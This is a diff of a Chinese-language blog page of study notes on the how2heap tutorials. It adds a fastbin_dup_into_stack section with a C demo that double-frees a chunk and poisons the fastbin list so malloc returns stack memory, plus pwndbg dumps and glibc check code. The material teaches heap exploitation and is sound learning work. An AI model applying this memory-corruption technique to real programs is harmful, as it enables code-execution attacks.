@@ -15,7 +15,7 @@
 <meta property="og:description" content="0x01 环境how2heap 是由 shellphish 团队制作的堆利用教程，介绍了多种堆利用技术。使用 Ubuntu 16.04 64位系统环境，glibc 版本如下： $ file /lib/x86_64-linux-gnu/libc-2.23.so /lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://1nv0k3r.me/2019/02/26/how2heap-学习记录/1.jpg">
-<meta property="og:updated_time" content="2019-03-04T11:31:59.442Z">
+<meta property="og:updated_time" content="2019-03-05T04:45:44.766Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="How2heap 学习记录">
 <meta name="twitter:description" content="0x01 环境how2heap 是由 shellphish 团队制作的堆利用教程，介绍了多种堆利用技术。使用 Ubuntu 16.04 64位系统环境，glibc 版本如下： $ file /lib/x86_64-linux-gnu/libc-2.23.so /lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-">
@@ -105,7 +105,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-环境"><span class="toc-number">1.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-堆分配机制-amp-malloc-amp-free"><span class="toc-number">2.</span> <span class="toc-text">0x02 堆分配机制 &amp; malloc &amp; free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-malloc-size-t-n"><span class="toc-number">2.1.</span> <span class="toc-text">malloc: malloc(size_t n)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free-free-void-p"><span class="toc-number">2.2.</span> <span class="toc-text">free: free(void* p)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwndbg的几个操作指令"><span class="toc-number">3.</span> <span class="toc-text">0x03 pwndbg的几个操作指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-first-fit"><span class="toc-number">4.</span> <span class="toc-text">0x04 first_fit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-fastbin-dup"><span class="toc-number">5.</span> <span class="toc-text">0x05 fastbin_dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-fastbin-dup-into-stack"><span class="toc-number">6.</span> <span class="toc-text">0x06 fastbin_dup_into_stack</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-环境"><span class="toc-number">1.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-堆分配机制-amp-malloc-amp-free"><span class="toc-number">2.</span> <span class="toc-text">0x02 堆分配机制 &amp; malloc &amp; free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-malloc-size-t-n"><span class="toc-number">2.1.</span> <span class="toc-text">malloc: malloc(size_t n)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free-free-void-p"><span class="toc-number">2.2.</span> <span class="toc-text">free: free(void* p)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwndbg的几个操作指令"><span class="toc-number">3.</span> <span class="toc-text">0x03 pwndbg的几个操作指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-first-fit"><span class="toc-number">4.</span> <span class="toc-text">0x04 first_fit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-fastbin-dup"><span class="toc-number">5.</span> <span class="toc-text">0x05 fastbin_dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-fastbin-dup-into-stack"><span class="toc-number">6.</span> <span class="toc-text">0x06 fastbin_dup_into_stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-fastbin-dup-consolidate"><span class="toc-number">7.</span> <span class="toc-text">0x07 fastbin_dup_consolidate</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -433,7 +433,70 @@ fastbins
 </code></pre><p>此时, 如果我们malloc三个chunk, 将会从fastbins的链表中返回chunk</p>
 <p>可以在输出结果中看到0x1101010这个chunk被返回了两次</p>
 <p>同样的, 如果加上内存检测参数<code>-fsanitize=address -g</code>会提示有double-free漏洞</p>
-<h2 id="0x06-fastbin-dup-into-stack"><a href="#0x06-fastbin-dup-into-stack" class="headerlink" title="0x06 fastbin_dup_into_stack"></a>0x06 fastbin_dup_into_stack</h2>
+<h2 id="0x06-fastbin-dup-into-stack"><a href="#0x06-fastbin-dup-into-stack" class="headerlink" title="0x06 fastbin_dup_into_stack"></a>0x06 fastbin_dup_into_stack</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> stack_var = <span class="number">0x21</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *b = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="keyword">char</span> *c = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(a, <span class="string">"AAAAAAAA"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(b, <span class="string">"BBBBBBBB"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(c, <span class="string">"CCCCCCCC"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(9) %p points to %s\n"</span>, a, a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(9) %p points to %s\n"</span>, b, b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(9) %p points to %s\n"</span>, c, c);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then freeing another one %p.\n"</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one %p again.\n"</span>, a);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 4 buffers.\n"</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *d = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    *d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"4nd malloc(9) %p points to %p\n"</span>, d, &amp;d);</span><br><span class="line">    <span class="keyword">char</span> *e = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(e, <span class="string">"EEEEEEEE"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"5nd malloc(9) %p points to %s\n"</span>, e, e);</span><br><span class="line">    <span class="keyword">char</span> *f = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(f, <span class="string">"FFFFFFFF"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"6rd malloc(9) %p points to %s\n"</span>, f, f);</span><br><span class="line">    <span class="keyword">char</span> *g = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(g, <span class="string">"GGGGGGGG"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"7th malloc(9) %p points to %s\n"</span>, g, g);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个程序展示了如何通过修改fd指针在栈上伪造一个free chunk</p>
+<p>在malloc了3个chunk并且复制了3个字符串进去后:</p>
+<pre><code>pwndbg&gt; x/20gx 0x602000
+0x602000:    0x0000000000000000    0x0000000000000021
+0x602010:    0x4141414141414141    0x0000000000000000
+0x602020:    0x0000000000000000    0x0000000000000021
+0x602030:    0x4242424242424242    0x0000000000000000
+0x602040:    0x0000000000000000    0x0000000000000021
+0x602050:    0x4343434343434343    0x0000000000000000
+0x602060:    0x0000000000000000    0x0000000000020fa1
+</code></pre><p>对第一个chunk double free后:</p>
+<pre><code>pwndbg&gt; x/20gx 0x602000
+0x602000:    0x0000000000000000    0x0000000000000021
+0x602010:    0x0000000000602020    0x0000000000000000
+0x602020:    0x0000000000000000    0x0000000000000021
+0x602030:    0x0000000000602000    0x0000000000000000
+0x602040:    0x0000000000000000    0x0000000000000021
+0x602050:    0x4343434343434343    0x0000000000000000
+0x602060:    0x0000000000000000    0x0000000000020fa1
+
+pwndbg&gt; fastbins 
+fastbins
+0x20: 0x602000 —▸ 0x602020 ◂— 0x602000
+0x30: 0x0
+</code></pre><p>接着malloc一个chunk, 内容为栈地址(stack_var - 0x08)</p>
+<pre><code>pwndbg&gt; x/20gx 0x602000
+0x602000:    0x0000000000000000    0x0000000000000021
+0x602010:    0x00007fffffffdd90    0x0000000000000000
+0x602020:    0x0000000000000000    0x0000000000000021
+0x602030:    0x0000000000602000    0x0000000000000000
+0x602040:    0x0000000000000000    0x0000000000000021
+0x602050:    0x4343434343434343    0x0000000000000000
+0x602060:    0x0000000000000000    0x0000000000020fa1
+</code></pre><p>可以看到, 第一个chunk被重新分配, 并保存了我们的栈顶地址(rsp)</p>
+<p>这也是为什么stack_var被设置为0x21(0x20也可以), 设置一个和之前chunk大小相同的size</p>
+<pre><code>pwndbg&gt; stack
+00:0000│ rsp  0x7fffffffdd90 ◂— 0x0
+01:0008│      0x7fffffffdd98 ◂— 0x21 /* &apos;!&apos; */
+02:0010│      0x7fffffffdda0 —▸ 0x602010 —▸ 0x7fffffffdd90 ◂— 0x0
+pwndbg&gt; x/20gx 0x7fffffffdd90
+0x7fffffffdd90:    0x0000000000000000    0x0000000000000021 &lt;------------------ fake chunk
+0x7fffffffdda0:    0x0000000000602010    0x0000000000602010
+</code></pre><p>glibc 在执行分配操作时，若块的大小符合 fast bin，则会在对应的 bin 中寻找合适的块，此时 glibc 将根据候选块的 size 字段计算出 fastbin 索引，然后与对应 bin 在 fastbin 中的索引进行比较，如果二者不匹配，则说明块的 size 字段遭到破坏。所以需要 fake chunk 的 size 字段被设置为正确的值。</p>
+<p>glibc 检查代码:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      [...]</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">"malloc(): memory corruption (fast)"</span>;</span><br><span class="line">              [...]</span><br><span class="line">            &#125;</span><br><span class="line">            [...]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>由于我们对第一个chunk进行了两次free, 那么在第四次malloc并把栈地址输入进去的时候, 伪造的chunk实际上替代了第二次free第一个malloc的chunk</p>
+<p>这时候的fastbins链表是一个正常的fastbins链表(没有double free的bin)</p>
+<pre><code>pwndbg&gt; fastbins 
+fastbins
+0x20: 0x602020 —▸ 0x602000 —▸ 0x7fffffffdd90 —▸ 0x602010 ◂— 0x0
+</code></pre><p>可以看到伪造的chunk已经放在fastbins里了</p>
+<p>我们这时再进行两次malloc, 取出第一次和第二次free的chunk, 将伪造的chunk放在表头</p>
+<pre><code>pwndbg&gt; fastbins 
+fastbins
+0x20: 0x7fffffffdd90 —▸ 0x602010 ◂— 0x0
+</code></pre><p>然后malloc一次, 即可在fake chunk处分配内存</p>
+<pre><code>pwndbg&gt; x/20gx 0x7fffffffdd90 (stack)
+0x7fffffffdd90:    0x0000000000000000    0x0000000000000021
+0x7fffffffdda0:    0x4747474747474747    0x0000000000602010
+0x7fffffffddb0:    0x0000000000602030    0x0000000000602050
+0x7fffffffddc0:    0x0000000000602030    0x0000000000602010
+0x7fffffffddd0:    0x00007fffffffdda0    0x3bfa61ab402a0700
+</code></pre><h2 id="0x07-fastbin-dup-consolidate"><a href="#0x07-fastbin-dup-consolidate" class="headerlink" title="0x07 fastbin_dup_consolidate"></a>0x07 fastbin_dup_consolidate</h2>
       <script>
         window.disqusProxy={
           shortname: 'blog-tw5j2p4htr',
@@ -484,7 +547,7 @@ fastbins
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-环境"><span class="toc-number">1.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-堆分配机制-amp-malloc-amp-free"><span class="toc-number">2.</span> <span class="toc-text">0x02 堆分配机制 &amp; malloc &amp; free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-malloc-size-t-n"><span class="toc-number">2.1.</span> <span class="toc-text">malloc: malloc(size_t n)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free-free-void-p"><span class="toc-number">2.2.</span> <span class="toc-text">free: free(void* p)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwndbg的几个操作指令"><span class="toc-number">3.</span> <span class="toc-text">0x03 pwndbg的几个操作指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-first-fit"><span class="toc-number">4.</span> <span class="toc-text">0x04 first_fit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-fastbin-dup"><span class="toc-number">5.</span> <span class="toc-text">0x05 fastbin_dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-fastbin-dup-into-stack"><span class="toc-number">6.</span> <span class="toc-text">0x06 fastbin_dup_into_stack</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-环境"><span class="toc-number">1.</span> <span class="toc-text">0x01 环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-堆分配机制-amp-malloc-amp-free"><span class="toc-number">2.</span> <span class="toc-text">0x02 堆分配机制 &amp; malloc &amp; free</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-malloc-size-t-n"><span class="toc-number">2.1.</span> <span class="toc-text">malloc: malloc(size_t n)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#free-free-void-p"><span class="toc-number">2.2.</span> <span class="toc-text">free: free(void* p)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-pwndbg的几个操作指令"><span class="toc-number">3.</span> <span class="toc-text">0x03 pwndbg的几个操作指令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-first-fit"><span class="toc-number">4.</span> <span class="toc-text">0x04 first_fit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-fastbin-dup"><span class="toc-number">5.</span> <span class="toc-text">0x05 fastbin_dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-fastbin-dup-into-stack"><span class="toc-number">6.</span> <span class="toc-text">0x06 fastbin_dup_into_stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-fastbin-dup-consolidate"><span class="toc-number">7.</span> <span class="toc-text">0x07 fastbin_dup_consolidate</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
